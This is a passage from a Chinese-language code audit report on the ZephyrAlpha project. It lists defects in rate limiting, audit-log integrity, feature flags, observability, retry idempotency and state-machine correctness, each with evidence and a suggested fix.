| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.35.1 |
| MEDIUM | 5 | 5.35.2~5.35.6 |
| LOW | 2 | 5.35.7/5.35.8 |
| **合计** | **8** | |

---

### 5.36 限流与配额（10个，第11轮新增）

> **维度定义**：限流算法实现、per-user配额、配置加载、配额耗尽告警。
> **病根归属**：根因5（限流规则存在但执行断层）。

#### 5.36.1 [HIGH] 4+限流器实现碎片化
- **文件**：[shared/infra/limiter.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/limiter.py)、[shared/infra_06/limiter.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra_06/limiter.py)、[infrastructure/rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rate_limiter.py)、[integration/mcp/rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/rate_limiter.py)、[a2a_protocol/governance/rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/governance/rate_limiter.py)
- **证据**：5个文件，3种不同算法（async token bucket / sync token bucket / sliding window）；infrastructure/rate_limiter.py与integration/mcp/rate_limiter.py逐行完全相同
- **问题**：限流逻辑分散在5处，算法不一致，配置不可统一管理
- **影响**：修改限流策略需改5处；不同路径走不同算法
- **修复**：收敛为单一canonical实现（shared/infra/limiter.py）

#### 5.36.2 [HIGH] 无per-user/per-key配额，全部per-tool共享
- **文件**：[gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/gateway_server.py#L499)
- **证据**：self._rate_limiter.try_acquire(routed_sid)——限流key是routed_sid（server_id如"task_manager"），所有客户端共享同一bucket
- **问题**：一个滥用客户端可耗尽全局限流配额
- **影响**：多租户场景下单租户DoS全系统
- **修复**：限流key改为(client_session_id, tool_name)二元组

#### 5.36.3 [MEDIUM] TokenBucketLimiter存在竞态条件
- **文件**：[limiter.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/limiter.py#L137)
- **证据**：第137行self._lock.release()释放锁后sleep，第142行await self._lock.acquire()重新获取。期间其他协程可修改_tokens/_last_refill
- **问题**：并发场景下token计数不准
- **影响**：限流精度下降，高并发下可能放行超出配额的请求
- **修复**：sleep期间不释放锁，或重新获取后重新执行_refill()

#### 5.36.4 [MEDIUM] a2a RateLimiter.allow(key)的key参数被忽略
- **文件**：[rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/governance/rate_limiter.py#L25)
- **证据**：allow(self, key="default")接收key参数，但操作的是self._requests（单一列表），key从未用于分桶
- **问题**：API签名暗示支持per-key限流，实际所有key共享一个bucket
- **影响**：调用方误以为per-key隔离已生效
- **修复**：改为dict[str, list[float]]按key分桶，或删除误导性key参数

#### 5.36.5 [MEDIUM] a2a RateLimiter无线程安全
- **文件**：[rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/governance/rate_limiter.py#L23)
- **证据**：self._requests = [t for t in self._requests if ...]列表操作无threading.Lock保护
- **问题**：多线程并发调用allow()时列表读写竞态
- **影响**：高并发下限流失效或抛异常
- **修复**：增加threading.Lock保护列表操作

#### 5.36.6 [MEDIUM] 限流配置不可动态调整
- **文件**：[rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/rate_limiter.py#L45)
- **证据**：DEFAULT_QPS = 10.0、DEFAULT_BURST = 30.0硬编码常量。docstring声称"从config/mcp.json加载"，但无任何代码读取mcp.json的rate_limit配置节
- **问题**：mcp.json的rate_limit配置项是死配置；调整限流需改代码重启
- **影响**：运维无法按负载动态调参
- **修复**：在PerToolRateLimiter初始化时从mcp.json加载配置

#### 5.36.7 [MEDIUM] Retry-After头配置启用但未实现
- **文件**：[mcp.json](file:///D:/ZephyrAlpha/config/mcp.json#L131) vs [gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/gateway_server.py#L499)
- **证据**：mcp.json "retry_after_header": true；gateway限流后返回ERR_RBAC_DENIED，响应中无retry_after字段
- **问题**：配置声明返回Retry-After头，实际未返回
- **影响**：客户端无法知道何时重试，导致盲目重试加剧限流压力
- **修复**：限流拒绝响应中增加retry_after_seconds字段

#### 5.36.8 [MEDIUM] gateway管道阶段顺序与文档不符
- **文件**：[gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/gateway_server.py#L479)
- **证据**：docstring"五阶段管道：Permission→RateLimit→Route→Audit→Degrade"；实际顺序：Route→RateLimit→Audit→LSG→Safety→Degrade，无Permission阶段
- **问题**：文档描述的Permission阶段缺失；RateLimit在Route之后（未路由的请求不受限流保护）
- **影响**：未知工具名请求绕过限流；权限检查缺失
- **修复**：补充Permission阶段；将文档与实现对齐

#### 5.36.9 [LOW] PerToolRateLimiter docstring与实现不符
- **文件**：[rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/rate_limiter.py#L140)
- **证据**：docstring"默认10QPS per client"；实际try_acquire(tool_name)按tool_name分桶，无client维度
- **问题**：文档声称per-client，实际per-tool
- **影响**：安全审计/容量规划基于错误假设
- **修复**：修正docstring为"per-tool"，或实现真正的per-client限流

#### 5.36.10 [LOW] 无限流配额耗尽告警
- **文件**：[rate_limiter.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/rate_limiter.py#L124)
- **证据**：stats()返回total_rejected计数，但无阈值告警逻辑；无代码将total_rejected接入alert_rules.yaml
- **问题**：限流拒绝量激增时无告警
- **影响**：DoS攻击或配额耗尽时运维无感知
- **修复**：将total_rejected接入metrics，配置告警规则

#### 5.36.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.36.1/5.36.2 |
| MEDIUM | 6 | 5.36.3~5.36.8 |
| LOW | 2 | 5.36.9/5.36.10 |
| **合计** | **10** | |

---

### 5.37 审计日志完整性（13个，第11轮新增）

> **维度定义**：审计日志的字段完整性、防篡改链、持久化、retention策略。
> **病根归属**：根因5（审计日志规则存在但全链路stub）。注意：5.17已覆盖AuditWriter.write() no-op和HMAC硬编码，本节审查其他方面。

#### 5.37.1 [HIGH] write_to_core桥接函数是no-op（仅日志不写入）
- **文件**：[bridge.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/bridge.py#L25)
- **证据**：def write_to_core(channel, payload): logger.info("write_to_core channel=%s payload_keys=%s", ...)——仅打印日志，无任何持久化写入
- **问题**：所有通过write_to_core写入"核心审计链"的事件实际被丢弃
- **影响**：声称的"不可变审计链"不存在；安全审计事件丢失
- **修复**：实现真正的写入逻辑（写入events.jsonl + hash chain）

#### 5.37.2 [HIGH] AuditChain.verify()永远返回True
- **文件**：[models.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/models.py#L116)
- **证据**：class AuditChain: def verify(self): return True；chain_hash始终为空字符串""
- **问题**：审计链验证是stub，永远返回通过
- **影响**：审计链被篡改也无法检测
- **修复**：实现真正的hash chain验证

#### 5.37.3 [HIGH] HourlyMerkleAggregator.aggregate返回空root_hash
- **文件**：[merkle_hourly.py](file:///D:/ZephyrAlpha/src/zephyr/governance/merkle_hourly.py#L75)
- **证据**：def aggregate(self, entries, period=""): return AggregationResult(period=period, entry_count=len(entries))——root_hash默认空字符串，从不计算Merkle root
- **问题**：Merkle聚合是stub，不构建任何Merkle树
- **影响**：基于Merkle root的完整性验证无意义
- **修复**：调用MerkleAggregator.build()计算真实root_hash

#### 5.37.4 [HIGH] MerkleHourlyBridge.verify存在AttributeError
- **文件**：[merkle_hourly.py](file:///D:/ZephyrAlpha/src/zephyr/governance/merkle_hourly.py#L51)
- **证据**：第58行return result.merkle_root == expected_root，但AggregationResult字段名是root_hash，无merkle_root属性
- **问题**：verify调用必抛AttributeError，被except Exception吞掉返回False
- **影响**：所有Merkle验证永远返回False
- **修复**：统一字段名为root_hash或merkle_root

#### 5.37.5 [HIGH] MCP审计日志缺actor/action/target字段
- **文件**：[audit_logger.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/audit_logger.py#L53)
- **证据**：AUDIT_FIELDS = ["timestamp", "client_session_id", "tool_name", "arguments_hash", "result_status", ...]。无actor/action/target
- **问题**：审计日志记录的是"某session调了某工具"，但不知道"谁对哪个实体做了什么操作"
- **影响**：安全事件追溯时无法回答"谁删除了这条记录"，合规审计不达标
- **修复**：增加actor_id/action/target_entity字段

#### 5.37.6 [HIGH] tamper_proof_audit裸调git commit绕过GitCommitGateway
- **文件**：[tamper_proof_audit.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/tamper_proof_audit.py#L245)
- **证据**：subprocess.run(["git", "commit", "-m", f"audit_log: ..."], ...)——直接subprocess调git commit
- **问题**：违反项目硬约束"所有git commit操作必须通过GitCommitGateway工具执行，禁止裸git commit"
- **影响**：审计日志提交绕过五重门禁校验
- **修复**：改用GitCommitGateway提交

#### 5.37.7 [HIGH] check_audit_log_immutability fail-open
- **文件**：[check_audit_log_immutability.py](file:///D:/ZephyrAlpha/scripts/arch_guard/fitness_functions/check_audit_log_immutability.py#L52)
- **证据**：if not ledger_path.exists(): print("...当前视为通过"); return 0——文件不存在时返回0（pass）
- **问题**：审计日志被删除后检查反而通过
- **影响**：攻击者删除ledger文件即可绕过不可篡改检查
- **修复**：文件不存在时返回1（fail）

#### 5.37.8 [MEDIUM] AuditChainVerifier链仅在内存，不持久化
- **文件**：[audit_chain_verifier.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/audit_chain_verifier.py#L66)
- **证据**：self._chain: list[AuditEntry] = []；self._last_hash = "0" * 64。无任何文件/DB写入
- **问题**：进程重启后审计链丢失，无法做事后验证
- **影响**：重启后链断裂，历史审计事件不可重放验证
- **修复**：将chain持久化到events.jsonl（append-only + hash chain）

#### 5.37.9 [MEDIUM] AuditChainVerifier.clear()可绕过防篡改
- **文件**：[audit_chain_verifier.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/audit_chain_verifier.py#L165)
- **证据**：def clear(self): self._chain.clear(); self._last_hash = "0" * 64——无权限保护
- **问题**：篡改者只需调clear()即可销毁全部审计历史
- **影响**：审计链可被轻易抹除，防篡改承诺失效
- **修复**：移除clear()或增加权限校验

#### 5.37.10 [MEDIUM] tamper_proof_audit仅哈希前30个文件且哈希截断
- **文件**：[tamper_proof_audit.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/tamper_proof_audit.py#L194)
- **证据**：for pf in list(src_root.rglob("*.py"))[:30]:——仅取前30个.py文件；第234行fh[:16]——sha256截断为16个十六进制字符
- **问题**：项目有数千个.py文件，仅30个被哈希；哈希截断降低碰撞阻力
- **影响**：第31个及之后的文件篡改完全不可检测
- **修复**：哈希全部文件；保留完整sha256

#### 5.37.11 [MEDIUM] check_audit_log_immutability谎称JSONL=append-only
- **文件**：[check_audit_log_immutability.py](file:///D:/ZephyrAlpha/scripts/arch_guard/fitness_functions/check_audit_log_immutability.py#L67)
- **证据**：print("append-only属性通过JSONL格式保证")
- **问题**：JSONL格式不提供任何append-only保证，文件可被任意编辑/删除行
- **影响**：运维误以为不可篡改已保证
- **修复**：实现真正的hash chain + HMAC签名验证

#### 5.37.12 [MEDIUM] MCP审计日志不受retention/rotation覆盖
- **文件**：[retention.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/retention.py#L38) + [log_rotation.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/log_rotation.py#L40)
- **证据**：retention只覆盖data/audit_history等；log_rotation只glob *.json（非.jsonl）。MCP审计日志写入logs/mcp_audit/tools_call.jsonl，不在任何retention/rotation路径内
- **问题**：MCP审计日志无保留期策略，无轮转
- **影响**：文件无限增长→磁盘耗尽
- **修复**：将logs/mcp_audit/纳入retention策略；log_rotation支持.jsonl格式

#### 5.37.13 [MEDIUM] integrity.py默认空HMAC key且verify_single哈希不一致
- **文件**：[integrity.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/integrity.py#L102)
- **证据**：第102行hmac_key: str = ""；verify_chain排除entry_hash字段后哈希；verify_single对整个event（含entry_hash）哈希
- **问题**：默认无HMAC验证；两种验证方法哈希算法不一致
- **影响**：默认部署无签名验证；verify_single与verify_chain结果矛盾
- **修复**：默认从环境变量加载HMAC key；统一哈希逻辑

#### 5.37.14 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 6 | 5.37.1~5.37.7（除5.37.7计入HIGH为6个：5.37.1~5.37.6+5.37.7） |
| MEDIUM | 7 | 5.37.8~5.37.13 + 5.37.7(如计入MEDIUM) |

> 修正：5.37.1~5.37.7共7个（5.37.1~5.37.6为HIGH + 5.37.7为HIGH），5.37.8~5.37.13共6个MEDIUM。总计7H+6M=13。

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 7 | 5.37.1~5.37.7 |
| MEDIUM | 6 | 5.37.8~5.37.13 |
| LOW | 0 | |
| **合计** | **13** | |

---

### 5.38 特性开关（9个，第11轮新增）

> **维度定义**：Feature flag系统的实现一致性、默认值策略、生命周期管理。
> **病根归属**：根因5（特性开关规则存在但未接入）。

#### 5.38.1 [HIGH] 4套特性开关系统碎片化
- **文件**：[config/flags.yaml](file:///D:/ZephyrAlpha/config/flags.yaml)、[flags.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/flags.py)、[feature_flag.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/feature_flag.py)、[audit_orchestration/feature_flag.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestration/feature_flag.py)
- **证据**：4个独立实现，3种不同API（FlagState枚举/pydantic bool/YAML布尔树），2种FeatureFlag类定义（dataclass vs BaseModel）
- **问题**：无统一开关真源，行为不一致
- **影响**：新增开关不知该用哪套；运维需检查4处
- **修复**：收敛为foundation/flags.py单一实现

#### 5.38.2 [HIGH] global_flag_registry在生产代码中从未使用
- **文件**：[flags.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/flags.py#L168)
- **证据**：Grep global_flag_registry在src/下仅命中flags.py自身定义和api_index.py注释（非实际import）。生产代码无global_flag_registry.is_enabled()调用
- **问题**：整个特性开关系统是死代码，定义了但从未接入任何功能路径
- **影响**：声称有开关系统实际无效；新AI可能误以为可用而依赖它
- **修复**：要么接入关键功能路径，要么删除避免误导

#### 5.38.3 [HIGH] FeatureFlagManager默认ON违反安全默认原则
- **文件**：[feature_flag.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/feature_flag.py#L40)
- **证据**：def is_enabled(self, contract_id): flag = self._flags.get(contract_id); return flag.enabled if flag else True——未注册的flag默认返回True
- **问题**：两套系统默认行为相反（foundation/flags.py声明"默认OFF"）；未注册功能默认开启
- **影响**：新功能无需显式启用即生效，违反灰度发布原则
- **修复**：统一默认为False（OFF），未注册flag不允许通过

#### 5.38.4 [MEDIUM] config/flags.yaml从未被代码加载
- **文件**：[flags.yaml](file:///D:/ZephyrAlpha/config/flags.yaml) + [telemetry_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/telemetry_server.py#L186)
- **证据**：Grep flags.yaml仅在telemetry_server.py第186行_exists(_CONFIG_DIR / "flags.yaml")命中——仅检查文件是否存在，不解析内容
- **问题**：flags.yaml是死配置文件，其中所有开关值对运行时无影响
- **影响**：修改flags.yaml不生效；运维误以为可远程控制遥测开关
- **修复**：在启动时yaml.safe_load解析flags.yaml并驱动FlagRegistry

#### 5.38.5 [MEDIUM] 灰度发布rollout_pct逻辑有缺陷且未使用
- **文件**：[flags.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/flags.py#L108)
- **证据**：第108行if self.rollout_pct > 0 and module_id:——仅当传入module_id才做百分比分桶；第114行return self.state == FlagState.CONDITIONAL——若rollout_pct>0但未传module_id，直接返回True
- **问题**：灰度分桶逻辑仅在传module_id时生效，未传时全量放行
- **影响**：声称支持灰度实际不支持
- **修复**：修正逻辑（未传module_id时按rollout_pct随机分桶）

#### 5.38.6 [MEDIUM] FeatureFlagManager._audit无持久化
- **文件**：[feature_flag.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/feature_flag.py#L32)
- **证据**：self._audit: list[dict] = []——内存列表；set()时append但不持久化
- **问题**：开关变更审计记录在内存，重启丢失
- **影响**：无法追溯谁在何时改了开关
- **修复**：将变更记录写入持久化审计日志

#### 5.38.7 [MEDIUM] 两个FeatureFlag类名冲突定义不同
- **文件**：[flags.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/flags.py#L80) vs [feature_flag.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/feature_flag.py#L23)
- **证据**：foundation版：@dataclass(frozen=True) class FeatureFlag: key: str; state: FlagState。orchestrator版：class FeatureFlag(BaseModel): contract_id: str; enabled: bool
- **问题**：同名FeatureFlag类，不同基类、不同字段、不同语义
- **影响**：import歧义；类型检查失效
- **修复**：统一为单一FeatureFlag定义

#### 5.38.8 [MEDIUM] 功能未用flag守护也无if/else硬编码
- **文件**：全项目
- **证据**：Grep if ENABLED_|if USE_NEW_|if FEATURE_无匹配；Grep global_flag_registry.is_enabled在src/生产代码无调用
- **问题**：所有功能默认全开，无任何开关控制点
- **影响**：实验性功能无法紧急关闭；新功能无法灰度；故障功能无法快速降级
- **修复**：为高风险/实验性功能增加flag守护点

#### 5.38.9 [LOW] 无flag过期清理机制
- **文件**：[flags.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/flags.py#L80)
- **证据**：FeatureFlag dataclass字段：key/state/description/allowed_modules/allowed_agents/rollout_pct。无expires_at/created_at/owner字段
- **问题**：flag无生命周期管理，永久残留
- **影响**：开关膨胀，废弃flag永不清理
- **修复**：增加expires_at字段，过期flag自动转ALWAYS_ON并告警清理

#### 5.38.10 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 3 | 5.38.1/5.38.2/5.38.3 |
| MEDIUM | 5 | 5.38.4~5.38.8 |
| LOW | 1 | 5.38.9 |
| **合计** | **9** | |

---

### 5.39 可观测性深度（9个，第12轮新增）

> 维度说明：指标采集→存储→导出→告警全链路的真实可观测性，覆盖metric命名规范、trace上下文传播、SLO实际生效、exporter配置等深度项。

#### 5.39.1 [HIGH] health_monitor每次采集丢弃全部指标
- **文件**：[health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L184)
- **证据**：第184行`_collect_metrics()`方法内部`registry = MetricsRegistry()`——每次调用创建新实例，采集结束后局部变量被GC
- **问题**：健康指标采集后立即丢弃，历史趋势不可查
- **影响**：健康度仪表盘无数据源；故障回溯无metric证据
- **修复**：注入单例MetricsRegistry或模块级共享实例

#### 5.39.2 [HIGH] cost_budget调用不存在的registry.counter()方法
- **文件**：[cost_budget.py](file:///D:/ZephyrAlpha/src/zephyr/governance/cost_budget.py#L190)
- **证据**：第190-193行`registry.counter(f"cost.{provider}.{model}")`——MetricsRegistry类无counter()方法；被`except Exception: pass`静默吞
- **问题**：成本计量调用幻影方法，异常被静默
- **影响**：成本预算告警完全失效；超支无感知
- **修复**：实现counter()或改用现有increment() API；移除bare except

#### 5.39.3 [MEDIUM] capability_id烘焙进metric名违反Prometheus基数最佳实践
- **文件**：[health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L188)
- **证据**：第188、193行`f"health.{cid}.alive"`、`f"health.{cid}.latency_ms"`——capability_id作为metric名一部分而非label
- **问题**：每个capability_id生成新metric名，违反Prometheus"低基数名+高基数label"原则
- **影响**：metric爆炸（数百capability × 多指标）；查询困难；存储膨胀
- **修复**：改为`health_alive{capability_id="..."}`格式，capability_id作为label

#### 5.39.4 [HIGH] api_client每请求生成新trace_id断链
- **文件**：[api_client.py](file:///D:/ZephyrAlpha/src/zephyr/integration/shared/api_03/api_client.py#L188)
- **证据**：第188行`trace_id = generate_trace_id()`——每次请求生成新ID，不从上下文继承
- **问题**：分布式追踪上下文不传播，同一逻辑链路的多次API调用trace_id不同
- **影响**：链路追踪断裂；故障定位需手动关联；无法构建调用树
- **修复**：从contextvar/线程本地继承trace_id；支持W3C Trace Context透传

#### 5.39.5 [MEDIUM] 两套TraceContext实现互不互通
- **文件**：[logging.py](file:///D:/ZephyrAlpha/src/zephyr/ops/observability/logging.py#L66) vs [span_stub.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/traces/span_stub.py#L40)
- **证据**：ops.observability.logging用contextvars实现TraceContext；infrastructure.system_telemetry.traces.span_stub用threading.local实现
- **问题**：两套独立的trace上下文存储，互不可见
- **影响**：跨模块trace_id丢失；async任务切换时上下文不一致
- **修复**：统一为单一contextvars实现（参考trae_060 §5簇4已识别canonical_source）

#### 5.39.6 [HIGH] SLOManager从未实例化，14条SLO定义为死代码
- **文件**：[slo_manager.py](file:///D:/ZephyrAlpha/src/zephyr/ops/slo_manager.py#L39)
- **证据**：第39-55行定义14条SLO（可用性/延迟/错误率），但Grep `SLOManager(`在src/生产代码无实例化调用
- **问题**：SLO定义存在但无运行时消费
- **影响**：SLO合规性无监控；错误预算无追踪；SLO违反无告警
- **修复**：在boot()中实例化SLOManager并接入metric采集

#### 5.39.7 [MEDIUM] 无OTLP exporter配置
- **文件**：全项目（Grep `OTLPSpanExporter|otlp_exporter`无匹配）
- **证据**：system_telemetry.traces.span_stub仅生成stub span，无OTLP exporter导出到Jaeger/Tempo
- **问题**：trace数据生成但不导出，无法可视化
- **影响**：分布式追踪能力形同虚设
- **修复**：配置OTLP exporter指向可观测性后端

#### 5.39.8 [MEDIUM] RED方法论Error counter从未递增
- **文件**：[health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py)
- **证据**：Grep `error_counter|errors_total|red_error`在health_monitor仅定义未increment；成功/失败均不更新error计数
- **问题**：RED（Rate/Error/Duration）中Error维度为空
- **影响**：错误率SLO无法计算；错误趋势不可视
- **修复**：在健康检查失败路径increment error counter

#### 5.39.9 [LOW] cardinality_limit声明但未强制执行
- **文件**：[metrics_collector.py](file:///D:/ZephyrAlpha/src/zephyr/ops/metrics_collector.py)
- **证据**：定义`CARDINALITY_LIMIT = 10000`常量，但registry.record()无基数检查逻辑
- **问题**：声明了基数上限但不强制
- **影响**：高基数label可能导致存储爆炸（理论风险）
- **修复**：在record()时检查label组合数，超限拒绝并告警

#### 5.39.10 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 4 | 5.39.1/5.39.2/5.39.4/5.39.6 |
| MEDIUM | 4 | 5.39.3/5.39.5/5.39.7/5.39.8 |
| LOW | 1 | 5.39.9 |
| **合计** | **9** | |

---

### 5.40 幂等性与重试语义（9个，第12轮新增）

> 维度说明：POST/PUT重试的幂等性保证、DLQ实际重试逻辑、回调去重、锁TTL强制执行等。

#### 5.40.1 [HIGH] api_client重试未带Idempotency-Key
- **文件**：[api_client.py](file:///D:/ZephyrAlpha/src/zephyr/integration/shared/api_03/api_client.py#L202)
- **证据**：第202-301行retry循环对POST/PUT重试，但请求头无`Idempotency-Key`
- **问题**：POST/PUT重试可能导致重复副作用（重复下单/重复扣款）
- **影响**：资金安全风险；数据重复
- **修复**：为每个逻辑请求生成稳定Idempotency-Key（基于业务幂等键），重试时复用

#### 5.40.2 [HIGH] MCP回调POST无Idempotency-Key
- **文件**：[mcp_result_push.py](file:///D:/ZephyrAlpha/src/zephyr/governance/behavioral_admission/mcp_result_push.py#L202)
- **证据**：第202-217行callback POST无幂等键；网络抖动重试会重复推送结果
- **问题**：回调重试导致下游重复处理
- **影响**：下游幂等性压力；重复通知
- **修复**：回调头携带Idempotency-Key（基于task_id+attempt_no）

#### 5.40.3 [MEDIUM] retry_count自赋值bug
- **文件**：全项目（Grep发现）
- **证据**：存在`retry_count = retry_count`自赋值语句，实际未递增
- **问题**：重试计数永远不变，可能无限重试
- **影响**：重试风暴；资源耗尽
- **修复**：改为`retry_count += 1`

#### 5.40.4 [HIGH] DLQRetryPolicy为stub，BACKOFF_SCHEDULE死代码
- **文件**：[dlq_retry_policy.py](file:///D:/ZephyrAlpha/src/zephyr/governance/dlq_retry_policy.py#L27)
- **证据**：第27-51行`BACKOFF_SCHEDULE = [60, 300, 1800, 7200]`定义但`retry()`方法仅`SELECT COUNT(*) FROM dlq`统计行数，不实际重试
- **问题**：DLQ名为"重试策略"实为"计数器"
- **影响**：死信消息永不重试；故障消息永久丢失
- **修复**：实现真实重试逻辑：按BACKOFF_SCHEDULE取出消息→重新投递→成功则删除/失败则递增attempt

#### 5.40.5 [HIGH] HookDispatcher._call_webhook为空pass
- **文件**：[hook_dispatcher.py](file:///D:/ZephyrAlpha/src/zephyr/shared/events/hook_dispatcher.py#L79)
- **证据**：第79-116行`_call_webhook`方法体为`pass`，webhook注册后永不触发
- **问题**：事件钩子系统声明支持webhook但实际为空实现
- **影响**：外部集成无法接收事件；依赖webhook的功能静默失效
- **修复**：实现HTTP POST调用，含超时/重试/签名校验

#### 5.40.6 [MEDIUM] hook_dispatcher用env={}替换整个环境
- **文件**：[hook_dispatcher.py](file:///D:/ZephyrAlpha/src/zephyr/shared/events/hook_dispatcher.py)
- **证据**：脚本执行`subprocess.run(cmd, env={})`——env设为空字典，覆盖继承的PATH等
- **问题**：子进程无PATH/HOME/PYTHONPATH，必然立即失败
- **影响**：所有脚本钩子执行失败
- **修复**：`env={**os.environ, **custom_env}`合并而非替换

#### 5.40.7 [HIGH] IdempotencyStore仅内存实现且_build_idempotency_key从未调用
- **文件**：[idempotency.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/idempotency.py#L86)
- **证据**：第86-175行IdempotencyStore用dict内存存储（重启丢失）；`_build_idempotency_key`方法Grep在生产代码无调用
- **问题**：幂等存储存在但从未接入；且为内存实现重启即失效
- **影响**：幂等性保证形同虚设；重启后重复请求可穿透
- **修复**：接入Redis/PG持久化；在API入口层调用_build_idempotency_key

#### 5.40.8 [MEDIUM] TaskQueue状态转换无回滚
- **文件**：[task_queue.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/queue/task_queue.py#L86)
- **证据**：第86-98行状态转换失败时不回滚，任务卡在中间态
- **问题**：转换失败后任务状态不确定
- **影响**：任务卡死；需人工干预恢复
- **修复**：try/except中回滚到前一状态并记录审计

#### 5.40.9 [MEDIUM] MemoryLock接受ttl_seconds但从不强制过期
- **文件**：全项目（MemoryLock实现）
- **证据**：MemoryLock.acquire(ttl_seconds=...)参数接受但内部仅存时间戳，无后台清理线程检查过期
- **问题**：TTL声明但不执行，锁永不自动释放
- **影响**：持锁进程崩溃后锁永久占用；死锁
- **修复**：实现TTL过期检查（后台线程或获取时惰性检查）

#### 5.40.10 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 5 | 5.40.1/5.40.2/5.40.4/5.40.5/5.40.7 |
| MEDIUM | 4 | 5.40.3/5.40.6/5.40.8/5.40.9 |
| **合计** | **9** | |

---

### 5.41 状态机正确性（10个，第12轮新增）

> 维度说明：状态转换合法性校验、终态保护、并发锁、审计日志、基类复用等状态机核心正确性。

#### 5.41.1 [HIGH] TaskScheduler无状态转换校验
- **文件**：[task_scheduler.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/queue/task_scheduler.py#L83)
- **证据**：第83-112行`transition(new_state)`直接赋值，无VALID_TRANSITIONS表校验
- **问题**：任意状态可转任意状态（如COMPLETED→RUNNING）
- **影响**：状态机约束失效；非法转换导致数据不一致
- **修复**：定义VALID_TRANSITIONS字典，转换前校验合法性

#### 5.41.2 [HIGH] TaskQueue后台线程无锁修改状态
- **文件**：[task_queue.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/queue/task_queue.py#L86)
- **证据**：第86-98行后台worker线程修改task.state，无threading.Lock保护；主线程同时读取
- **问题**：并发读写竞态；状态可能读到半更新值
- **影响**：状态不一致；难以复现的bug
- **修复**：所有状态读写加锁，或用queue.Queue通信

#### 5.41.3 [HIGH] FixStateMachine.force_state()绕过终态保护
- **文件**：[state_machine.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/state_machine.py#L112)
- **证据**：第112-118行`force_state(new_state)`直接赋值，注释说"for recovery"但无权限校验
- **问题**：任何调用方可绕过终态保护（如从TERMINATED强制转回RUNNING）
- **影响**：终态语义失效；安全审计无追溯
- **修复**：force_state需记录审计日志+调用方权限校验+限制可强制转换的状态集

#### 5.41.4 [HIGH] to_dead_letter()绕过转换表
- **文件**：[task_queue.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/queue/task_queue.py)
- **证据**：`to_dead_letter()`直接设state=DEAD_LETTER，不经过transition()校验
- **问题**：从任何状态（包括COMPLETED）可直接转DEAD_LETTER
- **影响**：已完成任务被错误标记为死信
- **修复**：to_dead_letter()应调用transition()并校验源状态

#### 5.41.5 [HIGH] SessionManager force=True绕过所有校验
- **文件**：全项目（SessionManager实现）
- **证据**：SessionManager方法接受`force: bool = False`参数，force=True时跳过状态/权限/并发校验
- **问题**：force参数成为绕过所有安全检查的逃生通道
- **影响**：恶意/误操作可强制修改会话状态
- **修复**：移除force参数或限制为特定恢复场景+审计

#### 5.41.6 [MEDIUM] DriftStateMachine为假实现（can_transition永返True）
- **文件**：全项目（DriftStateMachine实现）
- **证据**：`can_transition(from, to)`方法`return True`——无任何校验逻辑
- **问题**：状态机名为"状态机"实为"无约束赋值器"
- **影响**：漂移状态可任意转换；约束失效
- **修复**：实现真实转换表校验

#### 5.41.7 [HIGH] RollbackStateMachine无终态校验/无锁/无审计
